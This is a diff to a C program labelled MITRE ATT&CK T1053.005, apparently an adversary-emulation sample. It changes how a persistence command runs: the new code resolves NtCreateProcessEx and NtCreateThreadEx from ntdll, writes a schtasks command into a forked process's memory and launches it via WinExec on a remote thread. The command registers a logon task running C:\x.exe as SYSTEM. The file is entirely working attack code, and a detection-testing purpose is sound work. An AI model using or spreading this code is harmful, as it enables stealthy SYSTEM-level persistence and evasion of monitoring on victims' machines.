@@ -3,66 +3,146 @@
 // ID        = T1053.005
 // Tactics   = Execution, Persistence, Privilege Escalation,
 
-#define _CRT_SECURE_NO_WARNINGS
 #include <windows.h>
+#include <winternl.h>
 #include <stdio.h>
 
-#define RUN(to_run) fprintf(batchFile, to_run "\n");
+#define RUN(to_run) const char* cmdArgs = to_run;
 
-STARTUPINFOA si;
-PROCESS_INFORMATION pi;
+// NtCreateProcessEx function prototype
+typedef NTSTATUS(WINAPI* NtCreateProcessExType)(
+    PHANDLE ProcessHandle,
+    ACCESS_MASK DesiredAccess,
+    PVOID ObjectAttributes,
+    HANDLE ParentProcess,
+    ULONG Flags,
+    HANDLE SectionHandle,
+    HANDLE DebugPort,
+    HANDLE ExceptionPort,
+    BOOLEAN InJob
+    );
+
+typedef NTSTATUS(WINAPI* NtCreateThreadExType)(
+    PHANDLE ThreadHandle,
+    ACCESS_MASK DesiredAccess,
+    PVOID ObjectAttributes,
+    HANDLE ProcessHandle,
+    PVOID StartRoutine,
+    PVOID Argument,
+    ULONG CreateFlags,
+    ULONG ZeroBits,
+    ULONG StackSize,
+    ULONG MaximumStackSize,
+    PVOID AttributeList);
 
 int main() {
-    // Step 1: Write the command to a .bat file
-    FILE* batchFile = fopen("example.bat", "w");
-    if (!batchFile) {
-        perror("Failed to create batch file");
-        return 1;
+    // Load ntdll.dll to retrieve NtCreateProcessEx
+    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    if (!ntdll) {
+        //printf("Failed to load ntdll.dll\n");
+        return -1;
     }
 
-    // Write a command to the batch file
-    fprintf(batchFile, "@echo off\n");
-    fprintf(batchFile, "echo This command is inside a batch file!\n");
+    NtCreateThreadExType NtCreateThreadEx = (NtCreateThreadExType)GetProcAddress(ntdll, "NtCreateThreadEx");
+    if (!NtCreateThreadEx) {
+        //printf("Failed to load NtCreateThreadEx\n");
+        return -1;
+    }
 
+    NtCreateProcessExType NtCreateProcessEx = (NtCreateProcessExType)GetProcAddress(ntdll, "NtCreateProcessEx");
+    if (!NtCreateProcessEx) {
+        //printf("Failed to locate NtCreateProcessEx in ntdll.dll\n");
+        return -1;
+    }
+
+    // Step 1: Open the current process as the parent process
+    HANDLE parentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
+    if (!parentProcess) {
+        //printf("Failed to open parent process (error %d)\n", GetLastError());
+        return -1;
+    }
+
+    // Step 2: Create a new process using NtCreateProcessEx
+    HANDLE newProcessHandle;
+    NTSTATUS status = NtCreateProcessEx(
+        &newProcessHandle,             // Process handle to be returned
+        PROCESS_ALL_ACCESS,            // Desired access
+        NULL,                          // Object attributes (NULL for default)
+        parentProcess,                 // Parent process handle
+        0,                             // Flags (e.g., 0 for default behavior)
+        NULL,                          // Section handle (e.g., NULL for new section)
+        NULL,                          // Debug port
+        NULL,                          // Exception port
+        FALSE                          // InJob (FALSE for not part of a job object)
+    );
+
+    if (status != 0) {
+        //printf("Failed to create process (status 0x%%x)\n", status);
+        CloseHandle(parentProcess);
+        return -1;
+    }
+
+    //printf("Process created successfully. Process handle: %%p\n", newProcessHandle);
+
+    // Step 3: Write the command line into the new process memory
     RUN("schtasks /create /tn \"abc\" /tr C:\\x.exe /sc ONLOGON /ru \"System\"");
+    //const char* cmdArgs = "calc.exe 0 1 0";
+    SIZE_T cmdArgsSize = lstrlenA(cmdArgs) + 1;
 
-    //fprintf(batchFile, "pause\n");
-    fclose(batchFile);
-
-    // Step 2: Execute the batch file using CreateProcessA
-    si.cb = sizeof(si);
-
-    // Command to execute the batch file
-    char command[] = "cmd /c example.bat";
-
-    // Create process
-    if (!CreateProcessA(
-        NULL,             // Application name
-        command,          // Command line
-        NULL,             // Process handle not inheritable
-        NULL,             // Thread handle not inheritable
-        FALSE,            // Set handle inheritance to FALSE
-        0,                // No creation flags
-        NULL,             // Use parent's environment block
-        NULL,             // Use parent's starting directory
-        &si,              // Pointer to STARTUPINFO structure
-        &pi))             // Pointer to PROCESS_INFORMATION structure
-    {
-        //printf("CreateProcessA failed (%d).\n", GetLastError());
-        return 1;
+    LPVOID remoteMemory = VirtualAllocEx(newProcessHandle, NULL, cmdArgsSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!remoteMemory) {
+        //printf("Failed to allocate memory in the new process (error %%d)\n", GetLastError());
+        CloseHandle(newProcessHandle);
+        CloseHandle(parentProcess);
+        return -1;
     }
 
-    // Wait until child process exits
-    WaitForSingleObject(pi.hProcess, INFINITE);
-
-    // Close process and thread handles
-    CloseHandle(pi.hProcess);
-    CloseHandle(pi.hThread);
-
-    // Clean up: Remove the batch file
-    if (remove("example.bat") != 0) {
-        perror("Failed to delete batch file");
+    if (!WriteProcessMemory(newProcessHandle, remoteMemory, cmdArgs, cmdArgsSize, NULL)) {
+        //printf("Failed to write memory in the new process (error %%d)\n", GetLastError());
+        VirtualFreeEx(newProcessHandle, remoteMemory, 0, MEM_RELEASE);
+        CloseHandle(newProcessHandle);
+        CloseHandle(parentProcess);
+        return -1;
     }
+
+    //printf("Command line written to the new process memory.\n");
+
+    HMODULE kernel32 = GetModuleHandleA("kernel32.dll");
+    FARPROC winExec = GetProcAddress(kernel32, "WinExec");
+
+    // Step 4: Start the process using a remote thread
+    HANDLE threadHandle;
+    status = NtCreateThreadEx(
+        &threadHandle,
+        THREAD_ALL_ACCESS,
+        NULL,
+        newProcessHandle,
+        winExec, // Entry point (WinExec)
+        remoteMemory, // Arguments (command line string)
+        FALSE,
+        0,
+        0,
+        0,
+        NULL
+    );
+
+    if (status < 0) {
+        //printf("Failed to create thread in the new process (status 0x%%x)\n", status);
+        VirtualFreeEx(newProcessHandle, remoteMemory, 0, MEM_RELEASE);
+        CloseHandle(newProcessHandle);
+        CloseHandle(parentProcess);
+        return -1;
+    }
+
+    //printf("Thread created successfully. New process started.\n");
+
+    // Wait for the thread to complete
+    WaitForSingleObject(threadHandle, INFINITE);
+
+    // Clean up
+    CloseHandle(threadHandle);
+    CloseHandle(newProcessHandle);
+    CloseHandle(parentProcess);
 
     return 0;
 }
